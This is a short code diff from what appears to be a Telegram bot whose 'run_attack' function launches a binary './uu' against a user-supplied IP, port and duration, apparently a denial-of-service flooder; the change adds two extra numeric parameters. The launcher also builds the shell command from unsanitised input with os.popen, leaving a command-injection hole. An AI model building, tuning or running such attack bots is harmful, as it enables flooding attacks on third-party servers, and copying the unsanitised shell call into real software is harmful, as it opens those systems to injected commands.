@@ -22,7 +22,7 @@ def start(update: Update, context: CallbackContext):
 
 def run_attack(chat_id, ip, port, duration, context):
     try:
-        process = os.popen(f"./uu {ip} {port} {duration}")
+        process = os.popen(f"./uu {ip} {port} {duration} 400 600")
         output = process.read()
         process.close()
 
